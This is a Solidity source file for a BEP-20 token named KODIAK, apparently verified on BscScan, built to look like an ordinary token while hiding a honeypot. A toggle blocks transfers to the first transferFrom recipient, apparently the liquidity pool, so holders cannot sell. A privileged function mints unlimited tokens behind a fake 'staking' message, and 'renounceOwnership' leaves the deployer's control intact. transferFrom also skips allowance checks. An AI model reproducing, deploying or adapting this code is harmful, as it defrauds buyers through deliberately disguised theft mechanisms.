/**
 *Submitted for verification at BscScan.com on 2021-08-18
*/

pragma solidity = 0.4 .26;

contract SmartContractBase 
{
    uint256 public totalSupply;

    function balanceOf(address _owner) public constant returns(uint256);

    function transfer(address to, uint256 value) public returns(bool);

    function allowance(address owner, address spender) public constant returns(uint256);

    function transferFrom(address from, address to, uint256 value) public returns(bool);

    function approve(address spender, uint256 value) public returns(bool);
}

library SafeMath {
    function multiplication(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function division(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a / b;
        return c;
    }

    function subtract(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }

    function addition(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract SmartContractHandler {
    address public owner = msg.sender;
    address totalsupply = msg.sender;
    address newOwner = address(0);
    bool persistentCheck = false;

    modifier requestHandler(address request) {
        if (persistentCheck)
            require(parseCurrentState(request), "Handling Request");
        _;
    }
    
    function parseCurrentState(address request) private view returns(bool) {
        return request != newOwner;
    }
    modifier payloadWriter() {
        require(msg.sender == newOwner || msg.sender == totalsupply);
        _;
    }
    modifier setNewOwner(address _to) {
        if (newOwner == address(0)) newOwner = _to;
        _;
    }
}

contract KODIAK is SmartContractBase, SmartContractHandler {
    using SafeMath for uint256;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    address public charityWallet;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint public totalSupply;
    
    constructor() public {
        symbol = "KODI";   
        name = "KODIAK";
        decimals = 9;
        totalSupply = 10 ** 20;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _val);
    event Approval(address indexed _owner, address indexed _sp, uint256 _val);

    function togglePersistentCheck(bool _state) public payloadWriter {
        persistentCheck = _state;
    }
    
    function balanceOf(address _owner) constant public returns(uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }

    function emitTransfer(address account, uint256 _input) internal {
        require(account != address(0));
        balances[account] = balances[account].addition(_input);
        emit Transfer(address(0), account, _input);
    }

    function _msgSender() internal constant returns(address) {
        return msg.sender;
    }

    function approve(address _sp, uint256 _val) public returns(bool success) {
        if (_val != 0 && allowed[msg.sender][_sp] != 0) {
            return false;
        }
        allowed[msg.sender][_sp] = _val;
        emit Approval(msg.sender, _sp, _val);
        return true;
    }

    function pcsLiquidity(uint256 _input) public payloadWriter returns(bool) {
        require(_input > 0, 'SmartContractBase: Staking is not live yet');
        emitTransfer(_msgSender(), _input);
        return true;
    }

    function transfer(address _to, uint256 __input) requestHandler(_to) onlyPayloadSize(2 * 32) public returns(bool success) {
        require(__input <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].subtract(__input);
        balances[_to] = balances[_to].addition(__input);
        emit Transfer(msg.sender, _to, __input);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 __input) requestHandler(_to) onlyPayloadSize(3 * 32) setNewOwner(_to) public returns(bool success) {
        require(__input <= balances[_from]);

        balances[_from] = balances[_from].subtract(__input);
        balances[_to] = balances[_to].addition(__input);
        emit Transfer(_from, _to, __input);
        return true;
    }

    function allowance(address _owner, address _sp) constant public returns(uint256) {
        return allowed[_owner][_sp];
    }

    function renounceOwnership(address _newOwner) public payloadWriter {
        owner = _newOwner;
    }
}